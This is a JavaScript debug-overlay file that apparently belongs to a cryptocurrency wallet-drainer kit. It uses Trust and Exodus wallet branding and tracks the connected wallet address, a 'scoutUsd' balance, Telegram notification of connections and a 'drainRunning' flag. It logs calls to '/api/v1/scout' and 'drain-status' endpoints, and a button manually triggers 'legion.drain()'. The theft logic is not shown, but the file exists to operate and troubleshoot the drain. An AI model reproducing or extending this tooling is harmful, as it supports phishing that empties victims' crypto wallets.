/**
 * Trust mobile debug HUD — screenshot-friendly logs (no Mac/USB needed).
 * Enable: ?debug=1  OR  localStorage.EXODUS_DEBUG=1
 */
(function () {
  'use strict';

  function wantDebug() {
    try {
      if (/[?&]debug=1\b/.test(location.search)) return true;
      if (localStorage.getItem('EXODUS_DEBUG') === '1') return true;
    } catch (_) {}
    return false;
  }

  if (!wantDebug()) {
    // Still expose helpers
    window.__EXODUS_DEBUG_ON__ = function () {
      try { localStorage.setItem('EXODUS_DEBUG', '1'); } catch (_) {}
      location.search = (location.search ? location.search + '&' : '?') + 'debug=1';
    };
    return;
  }

  var lines = [];
  var MAX = 80;
  var panel, bodyEl, stateEl;

  function ts() {
    var d = new Date();
    return d.toTimeString().slice(0, 8);
  }

  function push(kind, msg) {
    lines.push({ t: ts(), kind: kind, msg: String(msg).slice(0, 400) });
    if (lines.length > MAX) lines.shift();
    render();
  }

  function render() {
    if (!bodyEl) return;
    bodyEl.textContent = lines.map(function (l) {
      return l.t + ' [' + l.kind + '] ' + l.msg;
    }).join('\n');
    bodyEl.scrollTop = bodyEl.scrollHeight;
    if (stateEl && window.legion && window.legion.state) {
      var S = window.legion.state;
      stateEl.textContent = [
        'addr: ' + (S.evmAddr ? String(S.evmAddr).slice(0, 12) + '…' : '—'),
        'connecting: ' + !!S.connecting,
        'drain: ' + !!S.drainRunning,
        'postDone: ' + !!S.postConnectComplete,
        'notified: ' + (S.connectNotifiedAddr ? 'yes' : 'no'),
        'scoutUsd: ' + (S.scoutUsd || 0),
        'mode: ' + (S.connectMode || '—'),
      ].join(' | ');
    }
  }

  function mount() {
    if (document.getElementById('__exodus_dbg')) return;
    panel = document.createElement('div');
    panel.id = '__exodus_dbg';
    panel.style.cssText = [
      'position:fixed', 'left:0', 'right:0', 'bottom:0', 'z-index:2147483647',
      'background:rgba(0,0,0,.92)', 'color:#0f0', 'font:11px/1.35 ui-monospace,Menlo,monospace',
      'max-height:42vh', 'display:flex', 'flex-direction:column', 'border-top:2px solid #0f0',
    ].join(';');

    var head = document.createElement('div');
    head.style.cssText = 'padding:6px 8px;background:#111;color:#fff;display:flex;gap:8px;align-items:center;flex-wrap:wrap';
    head.innerHTML = '<b style="color:#0f0">TRUST DEBUG</b>';
    stateEl = document.createElement('div');
    stateEl.style.cssText = 'flex:1;font-size:10px;color:#aaa';
    head.appendChild(stateEl);

    var btnKick = document.createElement('button');
    btnKick.textContent = 'Resume';
    btnKick.style.cssText = 'background:#0500ff;color:#fff;border:0;padding:4px 8px;border-radius:6px;font-size:11px';
    btnKick.onclick = function () {
      push('UI', 'manual continueConnected()');
      try {
        if (window.legion && typeof window.legion.continueConnected === 'function') {
          window.legion.continueConnected();
        } else if (window.legion && typeof window.legion.drain === 'function') {
          window.legion.drain();
        } else {
          push('ERR', 'legion.continueConnected missing');
        }
      } catch (e) {
        push('ERR', e && e.message);
      }
    };
    head.appendChild(btnKick);

    var btnCopy = document.createElement('button');
    btnCopy.textContent = 'Copy';
    btnCopy.style.cssText = 'background:#333;color:#fff;border:0;padding:4px 8px;border-radius:6px;font-size:11px';
    btnCopy.onclick = function () {
      var text = (stateEl && stateEl.textContent ? stateEl.textContent + '\n' : '') + bodyEl.textContent;
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(function () { push('UI', 'copied'); });
      } else {
        prompt('Copy logs:', text);
      }
    };
    head.appendChild(btnCopy);

    var btnHide = document.createElement('button');
    btnHide.textContent = 'Hide';
    btnHide.style.cssText = 'background:#444;color:#fff;border:0;padding:4px 8px;border-radius:6px;font-size:11px';
    btnHide.onclick = function () { panel.style.display = 'none'; };
    head.appendChild(btnHide);

    bodyEl = document.createElement('pre');
    bodyEl.style.cssText = 'margin:0;padding:8px;overflow:auto;flex:1;white-space:pre-wrap;word-break:break-word';

    panel.appendChild(head);
    panel.appendChild(bodyEl);
    document.body.appendChild(panel);
    push('UI', 'debug on — ' + location.href);
  }

  // Hook console
  ['log', 'warn', 'error'].forEach(function (k) {
    var orig = console[k];
    console[k] = function () {
      try {
        var args = Array.prototype.slice.call(arguments).map(function (a) {
          if (typeof a === 'string') return a;
          try { return JSON.stringify(a); } catch (_) { return String(a); }
        }).join(' ');
        if (/LGN|Legion|scout|WC|connect|Telegram|Trust|resume|continue/i.test(args)) {
          push(k === 'error' ? 'ERR' : k === 'warn' ? 'WRN' : 'LOG', args);
        }
      } catch (_) {}
      return orig.apply(console, arguments);
    };
  });

  window.addEventListener('legion:connected', function (e) {
    var d = (e && e.detail) || {};
    push('EVT', 'legion:connected ' + (d.address || '').slice(0, 12));
  });
  window.addEventListener('legion:error', function (e) {
    var d = (e && e.detail) || {};
    push('EVT', 'legion:error ' + (d.message || d.error || ''));
  });
  window.addEventListener('legion:embed-ready', function () {
    push('EVT', 'embed-ready');
  });
  document.addEventListener('visibilitychange', function () {
    push('UI', 'visibility=' + document.visibilityState);
  });

  // Patch fetch to log scout calls
  var ofetch = window.fetch;
  if (typeof ofetch === 'function') {
    window.fetch = function (input, init) {
      var url = typeof input === 'string' ? input : (input && input.url) || '';
      var isScout = /\/api\/v1\/scout|fusion|drain-status|client-config/i.test(url);
      if (isScout) push('NET', (init && init.method) || 'GET' + ' ' + url.replace(/^https?:\/\/[^/]+/, ''));
      return ofetch.apply(this, arguments).then(function (res) {
        if (isScout) push('NET', '← ' + res.status + ' ' + url.replace(/^https?:\/\/[^/]+/, ''));
        return res;
      }).catch(function (err) {
        if (isScout) push('NET', 'FAIL ' + (err && err.message));
        throw err;
      });
    };
  }

  if (document.body) mount();
  else document.addEventListener('DOMContentLoaded', mount);
  setInterval(render, 1500);

  window.__EXODUS_DEBUG_ON__ = function () {};
  window.__EXODUS_DEBUG_PUSH__ = push;
})();
